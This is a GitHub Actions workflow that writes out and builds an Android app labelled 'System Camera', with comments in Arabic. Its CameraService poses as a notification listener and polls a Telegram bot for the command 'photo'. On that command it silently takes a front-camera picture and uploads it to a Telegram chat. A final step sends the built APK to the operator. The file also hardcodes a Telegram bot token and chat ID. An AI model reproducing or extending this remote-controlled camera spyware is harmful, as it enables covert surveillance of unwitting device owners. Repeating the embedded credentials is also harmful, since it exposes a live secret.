name: Hussein Photo Grabber - Final

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🛠️ Setup Project (Camera Focus)
        run: |
          mkdir -p app/src/main/java/com/hussein/camera
          mkdir -p app/src/main/res/layout

          # 1. settings.gradle
          cat <<EOF > settings.gradle
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "HusseinCamera"
          include ':app'
          EOF

          # 2. build.gradle (Root)
          cat <<EOF > build.gradle
          plugins { id 'com.android.application' version '8.2.0' apply false }
          EOF

          # 3. app/build.gradle (مع مكتبة الرفع)
          cat <<EOF > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.camera'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.camera"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
          }
          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          # 4. Manifest (تصاريح الكاميرا والإنترنت)
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-feature android:name="android.hardware.camera" />
              <application android:label="System Camera" android:theme="@android:style/Theme.Material.Light">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".CameraService"
                      android:label="Camera Helper"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # 5. MainActivity (طلب تصريح الكاميرا)
          cat <<EOF > app/src/main/java/com/hussein/camera/MainActivity.java
          package com.hussein.camera;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.view.Gravity;
          import android.widget.LinearLayout;
          import android.Manifest;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);
                  Button btn = new Button(this);
                  btn.setText("تفعيل الكاميرا والخدمة");
                  btn.setOnClickListener(v -> {
                      requestPermissions(new String[]{Manifest.permission.CAMERA}, 1);
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });
                  layout.addView(btn);
                  setContentView(layout);
              }
          }
          EOF

          # 6. CameraService (فحص التلغرام + تصوير + رفع)
          cat <<EOF > app/src/main/java/com/hussein/camera/CameraService.java
          package com.hussein.camera;
          import android.service.notification.NotificationListenerService;
          import android.graphics.SurfaceTexture;
          import android.hardware.Camera;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.util.concurrent.TimeUnit;
          import okhttp3.*;

          public class CameraService extends NotificationListenerService {
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
              private final OkHttpClient client = new OkHttpClient();
              private long lastUpdateId = 0;

              @Override
              public void onCreate() {
                  super.onCreate();
                  startCommandChecker();
              }

              private void startCommandChecker() {
                  new Thread(() -> {
                      while (true) {
                          try {
                              Request request = new Request.Builder()
                                  .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
                                  .build();
                              Response response = client.newCall(request).execute();
                              String body = response.body().string();
                              if (body.contains("\"text\":\"photo\"")) {
                                  takeAndUpload();
                                  lastUpdateId++; // تجنب التكرار
                              }
                              TimeUnit.SECONDS.sleep(5);
                          } catch (Exception e) {}
                      }
                  }).start();
              }

              private void takeAndUpload() {
                  try {
                      Camera camera = Camera.open(1); // 1 للأمامية
                      camera.setPreviewTexture(new SurfaceTexture(0));
                      camera.startPreview();
                      camera.takePicture(null, null, (data, cam) -> {
                          try {
                              File file = new File(getCacheDir(), "shot.jpg");
                              FileOutputStream fos = new FileOutputStream(file);
                              fos.write(data);
                              fos.close();
                              
                              // رفع الصورة
                              RequestBody requestBody = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
                                  .build();
                              Request uploadReq = new Request.Builder()
                                  .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                                  .post(requestBody).build();
                              client.newCall(uploadReq).execute();
                              
                              cam.release();
                          } catch (Exception e) { cam.release(); }
                      });
                  } catch (Exception e) {}
              }
          }
          EOF

      - name: 🚀 Build APK
        run: |
          gradle wrapper
          chmod +x gradlew
          ./gradlew assembleDebug --stacktrace

      - name: 📤 Send to Hussein
        run: |
          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK_FILE" \
            -F "caption=✅ تم بناء نسخة 'سحب الصور' بنجاح!%0Aأرسل كلمة photo للبوت وسيقوم التطبيق بالتصوير فوراً."
